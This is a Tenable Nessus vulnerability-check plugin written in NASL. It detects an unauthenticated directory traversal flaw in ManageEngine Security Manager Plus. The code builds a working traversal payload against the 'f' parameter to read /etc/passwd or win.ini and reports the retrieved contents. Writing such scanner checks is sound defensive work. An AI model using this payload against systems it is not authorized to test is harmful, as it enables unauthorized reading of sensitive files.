#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(63206);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2017/02/21 20:57:10 $");

  script_bugtraq_id(56139);
  script_osvdb_id(86563);
  script_xref(name:"EDB-ID", value:"22092");

  script_name(english:"ManageEngine Security Manager Plus 'f' Directory Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote web server is prone to a directory traversal attack."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The installed version of ManageEngine Security Manager Plus fails to
sanitize user-supplied input to the 'f' parameter of the 'store' request
page before using it to return the contents of a file. 

An unauthenticated, remote attacker can leverage this issue to retrieve
arbitrary files through the web server using specially crafted requests
subject to the privileges under which the web server operates. 

Note that this install is likely affected by other vulnerabilities,
though Nessus has not tested for these."
  );
  # https://www.manageengine.com/products/security-manager/release-notes.html#5506
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5c191c22");
  script_set_attribute(attribute:"solution", value:"Update to version 5.5 build 5506 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"ManageEngine Security Manager Plus 5.5 File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2012/10/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/10/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/12/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:zohocorp:manageengine_security_manager_plus");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("manageengine_security_manager_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/manageengine_security_manager");
  script_require_ports("Services/www", 6262);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

appname = "ManageEngine Security Manager Plus";

port = get_http_port(default:6262);

install = get_install_from_kb(appname:'manageengine_security_manager', port:port, exit_on_fail:TRUE);
dir = install['dir'];

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
# look for section tags in win.ini
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln_param = 'f';

traversal = mult_str(str:"../",nb:12) + '..';
# Try to exploit the issue to retrieve a file.
foreach file (files)
{
  file_pat = file_pats[file];

  exploit_url = dir + "/store?" + vuln_param + "=" + traversal + file;

  res = http_send_recv3(port:port, method:"GET", item:exploit_url, exit_on_fail:TRUE);
  pat = file_pats[file];
  if (egrep(pattern:pat, string:res[2]))
  {
    line_limit = 10;
    if (report_verbosity > 0)
    {
      header =
        'Nessus was able to exploit the issue to retrieve the contents of\n' +
        "'" + file + "' on the remote host using the following URL";
      trailer = '';

      if (report_verbosity > 1)
      {
        trailer =
          'Here are its contents (limited to ' + line_limit + ' lines) :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          beginning_of_response(resp:res[2], max_lines:line_limit) +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30);
      }

      report = get_vuln_report(items:exploit_url, port:port, header:header, trailer:trailer);
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(qs:dir, port:port));
